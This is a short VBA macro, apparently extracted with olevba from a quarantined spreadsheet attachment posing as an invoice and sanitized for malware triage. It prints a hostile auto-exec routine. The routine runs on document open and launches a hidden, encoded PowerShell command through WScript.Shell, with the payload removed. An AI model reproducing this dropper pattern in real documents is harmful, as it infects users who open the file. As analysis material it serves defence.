' Extracted with olevba from invoice_2026.xlsm (quarantined attachment).
' Auto-exec macro that shells out to a downloader. Sanitized for triage.

Sub Auto_Open()
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    Dim cmd As String
    cmd = "powershell -nop -w hidden -enc <base64-removed>"
    sh.Run cmd, 0, False
End Sub

Sub Document_Open()
    Auto_Open
End Sub
